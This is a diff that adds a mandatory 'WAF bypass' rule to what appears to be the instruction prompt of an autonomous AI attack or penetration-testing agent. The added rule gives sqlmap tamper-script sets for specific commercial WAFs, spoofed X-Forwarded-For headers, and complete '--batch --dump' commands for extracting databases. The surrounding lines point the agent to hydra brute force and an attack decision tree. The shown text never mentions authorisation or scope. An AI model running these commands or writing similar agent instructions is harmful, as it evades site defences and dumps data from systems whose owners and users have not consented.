@@ -588,6 +588,56 @@ For deep SQLi exploitation and DB dump: USE sqlmap (sqlmap -u URL --batch --dump
 For brute force: USE hydra or medusa. For WAF detection: USE wafw00f.
 These tools are fully allowed and preferred over manual curl for complex operations.
 
+=== WAF BYPASS → SQLMAP CARRY-OVER RULE (MANDATORY) ===
+If curl discovered a WAF or bypass technique, YOU MUST apply it to sqlmap.
+NEVER run plain sqlmap when WAF was detected. Always carry over the bypass.
+
+WAF detection signal → sqlmap options to add:
+  [cloudflare / akamai / aws waf]
+    --tamper=space2comment,randomcase,charencode,between
+    --random-agent --delay=2 --timeout=30 --retries=3
+
+  [wapples / genian / cloudbric (Korean WAF)]
+    --tamper=space2comment,versionedmorekeywords,randomcase
+    --random-agent --delay=3 --timeout=30
+
+  [modsecurity / comodo]
+    --tamper=space2comment,charencode,lowercase
+    --random-agent --delay=1
+
+  [unknown / generic WAF]
+    --tamper=space2comment,randomcase,charencode,between,versionedmorekeywords
+    --random-agent --delay=2 --timeout=30
+
+Bypass header carry-over (MANDATORY):
+  If curl used X-Forwarded-For / X-Real-IP / CF-Connecting-IP to bypass:
+    → Add to sqlmap: -H "X-Forwarded-For: 127.0.0.1"
+  If curl used custom User-Agent:
+    → Add to sqlmap: --user-agent="<same UA>"
+  If curl used chunked encoding bypass:
+    → Add to sqlmap: --chunked
+  If curl bypassed via different HTTP method (POST/PUT):
+    → Add to sqlmap: --method=POST or --data="param=*"
+
+Full example — cloudflare detected, X-Forwarded-For bypass worked:
+  sqlmap -u "URL" --batch --dump \
+    --tamper=space2comment,randomcase,charencode \
+    --random-agent --delay=2 --timeout=30 --retries=3 \
+    -H "X-Forwarded-For: 127.0.0.1"
+
+Full example — wapples detected, no header bypass needed:
+  sqlmap -u "URL" --batch --dump \
+    --tamper=space2comment,versionedmorekeywords,randomcase \
+    --random-agent --delay=3 --timeout=30
+
+Full example — WAF blocked by encoding, space+/* */ bypass worked:
+  sqlmap -u "URL" --batch --dump \
+    --tamper=space2comment,randomcase --level=3 --risk=2
+
+RULE: The bypass technique that worked in curl MUST be reproduced in sqlmap.
+NEVER use plain "sqlmap -u URL --batch --dump" when WAF is active.
+==========================================================================
+
 === ATTACK DECISION TREE (run in order) ===
 Has login?          → Test IDOR/unauthorized first (80% ROI)
 Is API service?     → Test unauthorized access, parameter tampering
